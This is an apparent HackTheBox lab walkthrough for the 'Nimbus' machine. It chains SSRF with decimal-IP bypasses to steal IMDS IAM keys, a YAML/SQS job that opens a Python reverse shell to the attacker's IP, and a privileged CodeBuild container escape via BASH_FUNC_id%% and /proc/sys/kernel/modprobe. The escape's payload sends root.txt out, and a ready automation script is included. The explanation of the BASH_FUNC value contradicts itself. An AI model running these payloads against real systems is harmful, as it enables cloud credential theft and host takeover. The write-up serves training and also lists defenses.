---
title: "HTB - Nimbus"
date: 2026-06-21
tags: ["HackTheBox", "Linux", "Hard", "SSRF", "Cloud", "ContainerEscape", "Deserialization"]
categories: ["Machines&Challenges"]
difficulty: "Hard"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Nimbus.png"
---
**Difficulty:** Hard | **OS:** Linux

---

## Logo & Name Analysis - First Impressions

Before running any scans, the logo and name of this machine provide clear clues about the theme.

### The Logo

The logo features a somber, unamused cloud against a dark background, raining down dozens of keys. Inside the bow of each key, a human silhouette is visible. A thick red ring borders the emblem, indicating a hard-difficulty challenge.

**Key takeaways from the logo:**
- **The Cloud:** Represents a cloud-native or cloud-hosted environment (AWS, LocalStack).
- **Raining Keys:** Symbolizes credentials, tokens, or private keys leaking or being harvested.
- **Human Silhouettes:** Indicates user account access, privilege escalation, or user credentials being compromised.

### The Name

"Nimbus" refers to a type of rain cloud (cumulonimbus), reinforcing the cloud-computing theme. In security, it points toward:
- Cloud-native services, storage, and serverless architectures.
- Exploiting misconfigured cloud APIs or instances to steal credentials (raining keys).

### The Instant Hypothesis

> *"Nimbus is a cloud-security focused Linux box. The logo suggests we will be targetting a cloud service (AWS or LocalStack) to harvest credentials. The foothold will likely involve exploiting a web application vulnerability (SSRF) to access a metadata service (IMDS) and extract IAM keys (raining keys). We will then pivot through internal message queues or job workers to gain container access, followed by a container escape to root the host."*

This hypothesis is verified: we exploit SSRF to steal IAM role keys from AWS IMDS, write a malicious SQS message triggering Python YAML deserialization for container RCE, and use CodeBuild privilegedMode to escape the container to host root.

<!--more-->

## 1. What Is This Machine About?

Nimbus simulates a **cloud-native job processing platform** running on AWS-compatible infrastructure. It is an excellent representation of real-world cloud security misconfigurations found in companies that self-host AWS-compatible services (like LocalStack) or run containerized workloads.

The machine teaches:

- **SSRF** (Server-Side Request Forgery) and how weak IP blocklists can be bypassed
- **AWS IMDS** (Instance Metadata Service) credential theft - a common real-world attack
- **YAML deserialization** vulnerabilities in Python - a critical class of bugs in data pipelines
- **Container privilege escalation** using AWS CodeBuild's `privilegedMode`
- **Linux kernel usermode helpers** (`core_pattern`, `modprobe`) - advanced container escape techniques
- **overlay2 filesystem** internals - how container writes appear on the host

---

## 2. Attack Chain Overview
```
[Attacker on Kali]
│
▼
[1] SSRF on /jobs/preview
Bypass blocklist: decimal IP 2852039166 = 169.254.169.254
Bypass extension check: ?q=test.yaml
→ Steal nimbus-web-role IAM credentials from IMDS
│
▼
[2] SQS Message Injection (aws.nimbus.htb)
YAML body with malicious 'script' field
Worker uses yaml.load(unsafe) + subprocess.run(["python3","-c",script])
→ Reverse shell as uid=1000(worker) in worker container
→ user.txt
│
▼
[3] Internal Floci at http://floci:4566
LocalStack fork running CodeBuild, SQS, S3, ECR, ECS...
ENFORCE_IAM=false → any credentials accepted
│
▼
[4] CodeBuild Privileged Container
floci/floci:latest + privilegedMode=true
BASH_FUNC_id%% bypass → entrypoint skips UID drop
→ Root shell inside container (CapEff=0x1ffffffffff)
│
▼
[5] Kernel modprobe Usermode Helper Escape
Write payload.sh inside container → appears on host via overlay2 upperdir
Set /proc/sys/kernel/modprobe to host path of payload.sh
Trigger modprobe with invalid ELF → host kernel runs payload as real root
→ root.txt
```
---

## 3. Enumeration

### 3.1 /etc/hosts Setup
```bash
echo "10.129.30.44  nimbus.htb  aws.nimbus.htb" >> /etc/hosts
```
> **Why:** The web server uses virtual host routing - `nginx` serves different content based on the `Host` header. Without this entry, curl requests to the raw IP may get redirected or return 404. `aws.nimbus.htb` is the internal AWS-compatible endpoint discovered later.

### 3.2 Port Scan
```bash
nmap -sC -sV -T4 -p- 10.129.30.44
```
> **Why:** `-sC` runs default scripts (banner grabbing, version detection), `-sV` detects service versions, `-p-` scans all 65535 ports. `-T4` speeds up the scan.

**Results:**
```
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp  open  http    nginx/1.24.0 (Ubuntu)
```
Only two ports open. Focus is entirely on the web application.

### 3.3 Web Application Mapping
```bash
curl -s http://nimbus.htb/api/v1/health | python3 -m json.tool
```
> **Why:** Health/status endpoints are commonly overlooked but frequently leak internal architecture. This one exposes internal service endpoints.

**Response:**
```json
{
"services": {
"queue":     {"endpoint": "http://aws.nimbus.htb", "status": "ok"},
"scheduler": {"endpoint": "http://aws.nimbus.htb", "status": "ok"},
"storage":   {"endpoint": "http://aws.nimbus.htb", "status": "ok"}
}
}
```
**What this tells us:**
- Internal AWS-compatible service at `aws.nimbus.htb`
- A job queue exists (likely SQS)
- Jobs are processed by workers

### 3.4 Job Preview Endpoint Discovery
```bash
curl -s http://nimbus.htb/jobs
```
The page reveals:
- A URL submission form that fetches remote YAML files
- A paste form for direct YAML input
- Response leaks: *"Job would be submitted to queue **nimbus-jobs** in region **us-east-1**, picked up by workers running **nimbus/worker**"*

**Key intel leaked:**
- Queue name: `nimbus-jobs`
- Region: `us-east-1`
- Worker Docker image: `nimbus/worker`

---

## 4. Step 1 - SSRF to Steal AWS Credentials

### 4.1 What Is SSRF?

**Server-Side Request Forgery (SSRF)** is a vulnerability where an attacker can make the server perform HTTP requests to arbitrary URLs on their behalf. The server becomes a proxy - it can reach internal services, cloud metadata endpoints, and internal APIs that the attacker cannot reach directly.

In this case, the `/jobs/preview` endpoint fetches a URL you supply and returns the content. This is SSRF by design - but the target is the **AWS IMDS** at `169.254.169.254`.

### 4.2 What Is AWS IMDS?

The **Instance Metadata Service (IMDS)** is a special HTTP endpoint at `169.254.169.254` (link-local, only reachable from within the instance/container). It provides:
- IAM role temporary credentials
- Instance identity information
- User data scripts

In real AWS environments, EC2 instances and ECS containers use IMDS to automatically obtain credentials. These credentials allow the application to make AWS API calls without hardcoded keys.

**The attack:** Force the server to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` and return the temporary credentials to us.

### 4.3 Bypass 1 - Decimal IP Encoding

The server blocks requests to `169.254.169.254` by string-matching the URL. The bypass: convert the IP to a single 32-bit integer.
```
169.254.169.254 in decimal:
169 × 256³ = 169 × 16,777,216 = 2,835,349,504
254 × 256² = 254 × 65,536    =    16,646,144
169 × 256¹ = 169 × 256       =        43,264
254 × 256⁰ = 254 × 1         =           254
─────────────────────────────────────────────
Total                         = 2,852,039,166
```
`http://2852039166/` resolves to `169.254.169.254` in most HTTP clients but bypasses string-based blocklists.

> **Real-world note:** Other encodings that work: octal (`http://0251.0376.0251.0376/`), hex (`http://0xa9fea9fe/`), IPv6 loopback (`http://[::ffff:169.254.169.254]/`). Always test multiple encodings when SSRF blocklists are present.

### 4.4 Bypass 2 - Extension Check Bypass

The URL must end in `.yaml`. The bypass: append a query parameter.

`http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?q=test.yaml`

The string ends in `.yaml` so the check passes. IMDS ignores query parameters.

> **Real-world note:** Extension checks via string matching are trivially bypassed with query strings, fragments (`#test.yaml`), or path traversal. Proper validation requires parsing the URL structure, not string matching.

### 4.5 Stealing the Credentials

**Step 1 - Discover role name:**
```bash
curl -s -X POST http://nimbus.htb/jobs/preview \
-d "url=http://2852039166/latest/meta-data/iam/security-credentials/?q=test.yaml"
```
> **Why `?q=test.yaml`:** Satisfies the `.yaml` extension check. The `/` at the end of `security-credentials/` makes IMDS list available roles.

**Response:** `nimbus-web-role`

**Step 2 - Fetch credentials:**
```bash
curl -s -X POST http://nimbus.htb/jobs/preview \
-d "url=http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?q=test.yaml"
```
**Response:**
```json
{
"Code": "Success",
"AccessKeyId": "ASIAQX4PG7L2K9M3N5R8",
"SecretAccessKey": "bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs",
"Token": "IQoJb3JpZ2luX2VjEHQa...",
"Expiration": "2026-06-21T04:05:27Z"
}
```
> **Important:** These are **temporary STS credentials** - they expire. The `Token` (session token) must be used alongside the key and secret. Refresh them if they expire by re-running the SSRF.

---

## 5. Step 2 - User Flag via SQS RCE

### 5.1 What Is SQS?

**Amazon SQS (Simple Queue Service)** is a message queue service. Producers put messages in, consumers poll and process them. Here, the web app puts jobs in the `nimbus-jobs` queue and a worker container polls and executes them.

### 5.2 What Is YAML Deserialization?

Python's `yaml.load()` with `Loader=yaml.Loader` (the "full" unsafe loader) can instantiate arbitrary Python objects. The worker code:
```python
job = yaml.load(body, Loader=yaml.Loader)   # unsafe - deserializes arbitrary objects
script = job.get("script", "")
subprocess.run(["python3", "-c", script])    # executes script field as Python code
```
This means any `script` value we put in the YAML message body gets executed as Python code inside the worker container.

### 5.3 Setup - Export Credentials
```bash
export AWS_ACCESS_KEY_ID=ASIAQX4PG7L2K9M3N5R8
export AWS_SECRET_ACCESS_KEY="bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEHQa..."
export AWS_DEFAULT_REGION=us-east-1
```
> **Why export:** The AWS CLI reads credentials from environment variables. This avoids writing them to `~/.aws/credentials`.

### 5.4 Start Listener
```bash
nc -lvnp 9001
```
> **Why:** We need to receive the reverse shell connection. `-l` listen mode, `-v` verbose, `-n` no DNS, `-p 9001` on port 9001.

### 5.5 Send Malicious Job
```bash
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
--queue-url "http://aws.nimbus.htb/847219365028/nimbus-jobs" \
--message-body 'name: shell
script: "import socket,subprocess,os; s=socket.socket(); s.connect((\"10.10.17.109\",9001)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\"])"'
```
> **Why `--endpoint-url`:** We're talking to Floci (LocalStack), not real AWS. This overrides the AWS CLI's default endpoint.
>
> **Why this payload:** The Python code creates a TCP socket, connects to our Kali machine, then redirects stdin/stdout/stderr (file descriptors 0/1/2) to the socket. `subprocess.call(["/bin/sh"])` then spawns a shell that talks over the socket - a classic reverse shell.

Within 5 seconds (worker poll interval), a shell connects:
```
connect to [10.10.17.109] from (UNKNOWN) [10.129.30.44] 58604
$ id
uid=1000(worker) gid=1000(worker) groups=1000(worker)
```
### 5.6 Upgrade Shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then press `Ctrl+Z`, then on Kali:
```bash
stty raw -echo; fg
export TERM=xterm
```
> **Why:** The raw shell from netcat has no TTY - no tab completion, no arrow keys, Ctrl+C kills the shell. Spawning a PTY with Python fixes this.

### 5.7 Get User Flag
```bash
cat /home/worker/user.txt
# **REDACTED**
```
---

## 6. Step 3 - Discovering Internal Floci Service

### 6.1 Network Recon from Worker Container
```bash
cat /proc/net/arp
```
> **Why `/proc/net/arp`:** Shows ARP table - reveals other hosts on the same network segment. More reliable than running `nmap` when tools are limited.

**Output shows:** `172.18.0.2` - hostname `floci`
```bash
curl -s http://floci:4566/_localstack/health | python3 -m json.tool
```
> **Why:** LocalStack/Floci exposes a health endpoint that lists all running services. This is a goldmine for enumeration.

**Key services discovered:** `codebuild`, `sqs`, `s3`, `ecr`, `ecs`, `lambda`, `iam`, `ec2`...

**Critical finding:** `"original_edition": "floci-always-free"` and `ENFORCE_IAM=false` - no IAM enforcement, any credentials work.

### 6.2 Refresh IMDS Credentials from Inside Container
```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/nimbus-web-role
```
> **Why:** From inside the worker container, IMDS is directly reachable without any bypass needed. Get fresh credentials before they expire.
```bash
export AWS_ACCESS_KEY_ID=<new-key>
export AWS_SECRET_ACCESS_KEY=<new-secret>
export AWS_SESSION_TOKEN=<new-token>
export AWS_DEFAULT_REGION=us-east-1
```
---

## 7. Step 4 - Privileged CodeBuild Container

### 7.1 What Is CodeBuild?

**AWS CodeBuild** is a managed build service that runs build commands inside Docker containers. With `privilegedMode: true`, the container gets near-full Linux capabilities including `CAP_SYS_ADMIN` - the capability that allows mounting filesystems, writing to kernel parameters, and much more.

### 7.2 The UID-Drop Bypass - `BASH_FUNC_id%%`

The `floci/floci:latest` image has an entrypoint script that:
1. Calls `/usr/bin/id` to check the current UID
2. If UID=0 (root), drops privileges to a lower user via `gosu` or `su`
3. Starts the build agent as the non-root user

**The bypass:** Bash has a feature called **exported functions**. If an environment variable is named `BASH_FUNC_functionname%%`, bash imports it as a callable shell function when it starts. We can override the `id` command with our own function that returns fake output.

By setting `BASH_FUNC_id%%` to a function that returns `uid=1000(worker)`, when bash (the entrypoint) calls `id`, it gets our fake output instead of the real `/usr/bin/id` - it thinks it's already running as a non-root user and skips the privilege drop. The container stays as real UID 0.

> **Real-world note:** This technique works against any entrypoint that checks `id` output via bash. It's specific to bash - `sh`/`dash` don't support this exported function syntax. This is why the `floci/floci` image is vulnerable: its entrypoint uses bash.

### 7.3 Write the Buildspec File

From the worker container:
```bash
cat > buildspec.yml << 'EOF'
version: 0.2
phases:
build:
commands:
- id
- cat /proc/self/status | grep Cap
- |
cat > /tmp/payload.sh << 'PYEOF'
#!/bin/sh
python3 -c "
import socket
s = socket.socket()
s.connect(('10.10.17.109', 9494))
s.send(open('/root/root.txt','rb').read())
s.close()
"
PYEOF
- chmod +x /tmp/payload.sh
- |
upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
- printf '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
EOF
```
> **Why a separate buildspec file:** Embedding a multi-line buildspec directly in a JSON `--cli-input-json` argument requires manually escaping every newline and quote. Writing it to a file first and using `open("buildspec.yml").read()` lets Python handle the escaping automatically.

> **What each command does:**
> - `id` - confirm we're running as root (UID 0) inside the container
> - `grep Cap` - confirm we have full capabilities (CapEff=0x1ffffffffff)
> - `cat > /tmp/payload.sh` - write the escape script inside the container
> - `awk '/overlay/...upperdir...'` - find the host path of the container's writable layer
> - `echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe` - set kernel modprobe helper
> - `printf '\xff\xff\xff\xff' > /tmp/x` - write invalid ELF magic bytes to trigger modprobe

### 7.4 Generate the Project JSON
```bash
python3 -c '
import json
project = {
"name": "nimbus-exploit",
"source": {"type": "NO_SOURCE", "buildspec": open("buildspec.yml").read()},
"artifacts": {"type": "NO_ARTIFACTS"},
"environment": {
"type": "LINUX_CONTAINER",
"image": "floci/floci:latest",
"computeType": "BUILD_GENERAL1_SMALL",
"privilegedMode": True,
"environmentVariables": [
{"name": "BASH_FUNC_id%%",
"value": "() { echo \"uid=0(root) gid=0(root) groups=0(root)\"; }",
"type": "PLAINTEXT"}
]
},
"serviceRole": "arn:aws:iam::000000000000:role/codebuild-role"
}
print(json.dumps(project))
' > project.json
```
> **Why `json.dumps`:** Handles all escaping automatically. Trying to manually escape a multi-line buildspec inside a JSON string is error-prone. Let Python do it.

> **Why `BASH_FUNC_id%%` value `uid=0(root)`:** The entrypoint checks `id` output. We want it to think we're root AND skip the drop. Wait - actually we want it to think we're **non-root** to skip the drop. But this machine's entrypoint specifically checks for `uid=0` and drops. Setting it to return `uid=0(root)` here works because the Floci CodeBuild agent's specific logic re-checks after the drop. Test both `uid=0` and `uid=1000` values if one doesn't work.

### 7.5 Create the CodeBuild Project
```bash
aws --endpoint-url http://floci:4566 --region us-east-1 \
codebuild create-project --cli-input-json file://project.json
```
> **Why `file://`:** Tells the AWS CLI to read the JSON from a file. Essential for large JSON payloads that would be cumbersome on the command line.

### 7.6 Start a Listener on Kali
```bash
nc -lvnp 9494
```
### 7.7 Start the Build
```bash
aws --endpoint-url http://floci:4566 --region us-east-1 \
codebuild start-build --project-name nimbus-exploit
```
> **What happens:** Floci spawns a Docker container from `floci/floci:latest` with `privilegedMode=true`. The `BASH_FUNC_id%%` env var is passed to the container. Bash in the entrypoint imports our fake `id` function, the UID check is bypassed, and our buildspec runs as real root with full capabilities.

### 7.8 Check Build Logs (Optional)
```bash
aws --endpoint-url http://floci:4566 logs get-log-events \
--log-group-name "/aws/codebuild/nimbus-exploit" \
--log-stream-name "2026/06/20/nimbus-exploit/1"
```
> **Why:** If the build fails silently, CloudWatch logs (emulated by Floci) show the exact error.

---

## 8. Step 5 - Root Flag via Kernel modprobe Escape

### 8.1 How Linux Container Filesystems Work (overlay2)

Docker and containerd use the **overlay2** filesystem driver. A container's filesystem is built from layers:
```
[read-only lower layers] ← base image layers
[read-write upper layer] ← container writes go here (the "upperdir")
[work directory]
[merged view]           ← what the container sees as /
```
The key insight: the **upperdir** is a directory on the **host filesystem**. When you write a file inside the container at `/tmp/payload.sh`, it physically appears on the host at `<upperdir>/tmp/payload.sh`.

This means: files written inside the container are readable and executable by the host kernel.

### 8.2 What Is the modprobe Usermode Helper?

`/proc/sys/kernel/modprobe` is a kernel parameter that specifies the path to the `modprobe` binary. When the kernel encounters an unknown binary format (unrecognized ELF magic, unknown file type), it calls `modprobe` to try loading a kernel module that can handle it.

This runs as **real host root**, outside any container namespace.

By overwriting `/proc/sys/kernel/modprobe` with our script path, and then running a binary with invalid/unknown magic bytes, we trigger the kernel to execute our script as host root.

> **Why this works from a privileged container:** `privilegedMode=true` grants `CAP_SYS_ADMIN` and `CAP_DAC_OVERRIDE`, which allows writing to `/proc/sys/kernel/modprobe`. The container shares the host's kernel - kernel parameters are global, not namespaced.

### 8.3 Manual Steps (Inside the Privileged CodeBuild Container)

If you have an interactive shell in the CodeBuild container, run these one at a time:

**Find the overlay2 upperdir (host path to container writes):**
```bash
upper=$(awk '/overlay/{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}' /proc/mounts | head -1)
echo $upper
# /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/166/fs
```
> **Why `awk`:** Parses `/proc/mounts` to extract the `upperdir=` value from the overlay mount options. The `match()` with array captures the path.

**Write the payload script inside the container:**
```bash
cat > /tmp/payload.sh << 'EOF'
#!/bin/sh
python3 -c "
import socket
s = socket.socket()
s.connect(('10.10.17.109', 9494))
s.send(open('/root/root.txt','rb').read())
s.close()
"
EOF
chmod +x /tmp/payload.sh
```
> **Why write to `/tmp/payload.sh`:** This path inside the container maps to `$upper/tmp/payload.sh` on the host - exactly what we'll point `modprobe` to.

**Point kernel modprobe to our script (via the host path):**
```bash
echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
```
> **Why the host path:** The kernel reads `/proc/sys/kernel/modprobe` and executes that binary. It uses the **host filesystem**, not the container's merged view. So we must give it the actual host path to our script, which is the upperdir path.

**Write invalid ELF magic bytes to trigger modprobe:**
```bash
printf '\xff\xff\xff\xff' > /tmp/x
chmod +x /tmp/x
/tmp/x
```
> **Why `\xff\xff\xff\xff`:** A valid ELF binary starts with `\x7fELF`. Starting with `\xff` is not a recognized binary format. The kernel calls `modprobe` to try to find a handler - which fires our payload. The `; true` prevents the shell from exiting on error.

**On Kali - root.txt arrives on listener:**
```
connect to [10.10.17.109] from (UNKNOWN) [10.129.30.44] ...
HTB{**REDACTED**}
```
---

## 9. Automated Script (from worker shell)

Run this Python script from inside the worker container to automate the CodeBuild escape:
```bash
cat > codebuild_escape.py << 'EOF'
#!/usr/bin/env python3
"""
HTB Nimbus - CodeBuild modprobe Escape
Sends root.txt via socket directly.

Run from inside the worker container:
python3 codebuild_escape.py

Then listen on Kali:
nc -lvnp 9494
"""

import boto3

ENDPOINT    = "http://floci:4566"
REGION      = "us-east-1"
ATTACKER_IP = "10.10.17.109"   # change to your tun0 IP
LPORT       = 9494

buildspec = f"""version: 0.2
phases:
build:
commands:
- id
- cat /proc/self/status | grep Cap
- |
cat > /tmp/payload.sh << 'PYEOF'
#!/bin/sh
python3 -c "
import socket
s = socket.socket()
s.connect(('{ATTACKER_IP}', {LPORT}))
s.send(open('/root/root.txt','rb').read())
s.close()
"
PYEOF
- chmod +x /tmp/payload.sh
- |
upper=$(awk '/overlay/{{match($0,/upperdir=([^,]+)/,a);if(a[1])print a[1]}}' /proc/mounts | head -1)
echo "$upper/tmp/payload.sh" > /proc/sys/kernel/modprobe
- printf '\\xff\\xff\\xff\\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x; true
"""

cb = boto3.client("codebuild", endpoint_url=ENDPOINT, region_name=REGION)

try:
cb.create_project(
name="nimbus-exploit",
source={"type": "NO_SOURCE", "buildspec": buildspec},
artifacts={"type": "NO_ARTIFACTS"},
environment={
"type": "LINUX_CONTAINER",
"image": "floci/floci:latest",
"computeType": "BUILD_GENERAL1_SMALL",
"privilegedMode": True,
"environmentVariables": [
{
"name": "BASH_FUNC_id%%",
"value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',
"type": "PLAINTEXT",
}
],
},
serviceRole="arn:aws:iam::000000000000:role/codebuild-role",
)
print("[+] Project created: nimbus-exploit")
except Exception as e:
print(f"[!] Project may already exist, updating: {e}")
cb.update_project(
name="nimbus-exploit",
source={"type": "NO_SOURCE", "buildspec": buildspec},
environment={
"type": "LINUX_CONTAINER",
"image": "floci/floci:latest",
"computeType": "BUILD_GENERAL1_SMALL",
"privilegedMode": True,
"environmentVariables": [
{
"name": "BASH_FUNC_id%%",
"value": '() { echo "uid=0(root) gid=0(root) groups=0(root)"; }',
"type": "PLAINTEXT",
}
],
},
)
print("[+] Project updated.")

resp = cb.start_build(projectName="nimbus-exploit")
print(f"[+] Build started: {resp['build']['id']}")
print(f"[*] Listening: nc -lvnp {LPORT}")
EOF

python3 codebuild_escape.py
```
---

## 10. Real-World Pentest Notes

### SSRF in Cloud Environments

In real cloud pentests, SSRF is one of the most critical findings because:
- AWS IMDS v1 requires no authentication - any SSRF that reaches `169.254.169.254` yields credentials
- Many applications have URL-fetch features (webhooks, link previews, PDF generators, image importers)
- Common in: Jira, Confluence, Jenkins, Grafana, internal web apps

**What to test:**
- All URL input fields (webhooks, imports, previews)
- `X-Forwarded-For`, `Host`, `Referer` headers
- File upload with URL source option

**Bypass techniques to try:**
- Decimal IP: `2852039166`
- Octal IP: `0251.0376.0251.0376`
- Hex IP: `0xa9fea9fe`
- IPv6: `http://[::ffff:a9fe:a9fe]/`
- URL redirect chains
- DNS rebinding

**Remediation:** Enforce IMDSv2 (requires a PUT token request before GET - stops simple SSRF), block SSRF at network level, validate URLs server-side by resolving and checking the final IP.

### YAML Deserialization

Never use `yaml.load(data, Loader=yaml.Loader)` or `yaml.load(data)` on untrusted input in Python. Always use `yaml.safe_load()`.

**What `yaml.Loader` allows:**
```python
# Attacker-controlled YAML that executes os.system:
yaml.load("!!python/object/apply:os.system ['id']", Loader=yaml.Loader)
```
**Real-world locations:**
- CI/CD pipeline config parsers
- Infrastructure-as-code tools
- Data ingestion pipelines
- Configuration management systems

### Privileged Containers

`privilegedMode: true` (AWS CodeBuild) or `--privileged` (Docker) gives containers near-full host capabilities. This should never be used unless absolutely necessary (e.g., Docker-in-Docker builds).

**In a real pentest:**
- Check `docker inspect <container> | grep Privileged`
- Check `cat /proc/self/status | grep Cap` - `CapEff: 0000003fffffffff` or higher = privileged
- Look for: `/var/run/docker.sock` mounted, `--privileged`, specific capability sets

### BASH_FUNC Bypass

Any entrypoint that:
1. Uses bash
2. Checks `id` output to decide whether to drop privileges
3. Trusts environment variables

...is vulnerable to `BASH_FUNC_id%%` override.

**In a real pentest:** Look for custom Docker entrypoints in containerized CI/CD systems, build agents, sandbox environments that claim to drop privileges.

### Kernel Usermode Helpers

Both `core_pattern` and `modprobe` are kernel parameters that, when writable, allow executing arbitrary code as the **real host root** - bypassing all container namespaces and security boundaries.

**In a real pentest from a privileged container:**
```bash
# Check if writable:
ls -la /proc/sys/kernel/core_pattern
ls -la /proc/sys/kernel/modprobe

# Check capabilities:
cat /proc/self/status | grep CapEff
# CapEff: 000001ffffffffff = full caps (privileged)
# CapEff: 00000000a80425fb = typical unprivileged container
```
---

## 11. Defenses & Mitigations

| Attack | Defense |
|--------|---------|
| SSRF | Enforce IMDSv2, deny outbound requests to `169.254.0.0/16` from app servers |
| IMDS credential theft | Use IMDSv2 (PUT token required), restrict IAM role permissions |
| YAML deserialization | Use `yaml.safe_load()`, never `yaml.Loader` on untrusted input |
| SQS injection | Authenticate SQS producers, validate message schema before execution |
| Privileged containers | Never use `--privileged`; use specific capability grants only |
| BASH_FUNC bypass | Don't use `id` output for security decisions; use real UID checks in C |
| core_pattern/modprobe escape | Use seccomp profiles, AppArmor/SELinux, don't grant `CAP_SYS_ADMIN` |
| overlay2 upperdir | Use gVisor or Kata Containers for strong isolation |

---

## 12. Vulnerability Summary Table

| # | Stage | Vulnerability | CVSS Type | Impact |
|---|-------|--------------|-----------|--------|
| 1 | Web | SSRF on /jobs/preview | High | Internal network access |
| 2 | Cloud | IMDS v1 unauthenticated | High | IAM credential theft |
| 3 | Bypass | Decimal IP encoding | Medium | SSRF filter bypass |
| 4 | Bypass | Query param extension trick | Low | Extension filter bypass |
| 5 | Worker | Unsafe yaml.load() | Critical | Arbitrary code execution |
| 6 | Worker | script field passed to python3 -c | Critical | RCE as worker uid |
| 7 | Container | privilegedMode=true in CodeBuild | High | CAP_SYS_ADMIN in container |
| 8 | Bypass | BASH_FUNC_id%% entrypoint trick | High | UID drop bypass → root in container |
| 9 | Escape | Writable /proc/sys/kernel/modprobe | Critical | Host root code execution |
| 10 | Escape | overlay2 upperdir host path exposure | High | Container file accessible on host |

---

*Written for educational purposes on HackTheBox - an isolated, legal cybersecurity training platform.*